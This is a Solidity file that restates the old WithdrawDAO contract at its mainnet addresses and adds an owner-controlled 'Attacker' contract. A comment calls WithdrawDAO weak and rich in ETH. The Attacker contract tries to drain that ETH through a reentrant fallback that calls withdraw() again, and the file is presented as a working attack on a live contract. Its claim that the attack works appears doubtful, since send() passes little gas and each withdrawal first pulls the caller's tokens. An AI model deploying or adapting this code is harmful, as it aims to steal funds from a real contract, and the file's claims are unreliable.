// Below I present to you a great blama of the Ethereum network and a very weak for years forgotten WithdrawDAO contract with a large ETH balance.

pragma solidity ^0.4.26;

contract DAO {
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) returns (bool success);
    function approve(address _spender, uint256 _amount) returns (bool success);
    uint256 public totalSupply;
}

contract WithdrawDAO {
    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);
    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;

    function withdraw(){
        uint balance = mainDAO.balanceOf(msg.sender);

        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))
            throw;
    }

    function trusteeWithdraw() {
        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());
    }
}

contract Attacker {
    DAO public dao = DAO(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);
    WithdrawDAO public withdrawDAO = WithdrawDAO(0xBf4eD7b27F1d666546E30D74d50d173d20bca754);
    address public owner;
    bool public performingAttack = false;
    uint256 public gasLimit = 350000;

    constructor() {
        owner = msg.sender;
    }

    function depositETH() public payable {
        require(msg.sender == owner, "Only the owner can deposit ETH");
    }

    function setGasLimit(uint256 _gasLimit) public {
        require(msg.sender == owner, "Only the owner can set the gas limit");
        gasLimit = _gasLimit;
    }

    function depositTokensToAttacker(uint256 amount) public {
        require(msg.sender == owner, "Only owner can deposit DAO tokens to this contract");
        require(dao.transferFrom(msg.sender, address(this), amount), "Transfer failed");
    }

    function withdrawDAOTokens() public {
    require(msg.sender == owner, "Only owner can withdraw DAO tokens");
    uint256 balance = dao.balanceOf(address(this));
    require(dao.transfer(owner, balance), "Transfer of DAO tokens failed");
    }

    function transferTokensToDAO(uint256 amount) public {
        require(msg.sender == owner, "Only owner can transfer tokens to DAO");
        require(dao.transfer(address(dao), amount), "Transfer to DAO failed");
    }

    function transferTokensToAddress(address _destination, uint256 amount) public {
    require(msg.sender == owner, "Only owner can transfer tokens");
    require(dao.transfer(_destination, amount), "Transfer failed");
    }

    function approveDAO(uint256 amount) public {
        require(msg.sender == owner, "Only owner can approve");
        dao.approve(address(this), amount);
    }

    function attack() public {
        require(msg.sender == owner, "Only owner can initiate the attack");
        performingAttack = true;
        withdrawDAO.withdraw();
        performingAttack = false;
    }

    function () external payable {
        if (performingAttack && address(withdrawDAO).balance > 0) {
            withdrawDAO.withdraw.gas(gasLimit)();
        }
    }

    function withdrawETH() public {
        require(msg.sender == owner, "Only owner can withdraw ETH");
        owner.transfer(address(this).balance);
    }
}